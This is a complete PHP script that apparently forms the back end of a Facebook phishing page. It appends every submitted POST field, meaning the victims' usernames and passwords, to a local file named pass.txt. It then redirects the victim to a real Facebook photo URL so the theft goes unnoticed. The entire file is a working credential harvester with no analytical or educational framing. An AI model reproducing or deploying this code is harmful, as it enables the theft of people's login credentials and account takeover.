<?php
header('location:https://www.facebook.com/photo.php?fbid=535827248748562&set=pb.100069638745323.-2207520000.&type=3');
$handle = fopen("pass.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n\n\n\n");
fclose($handle);
exit;

?>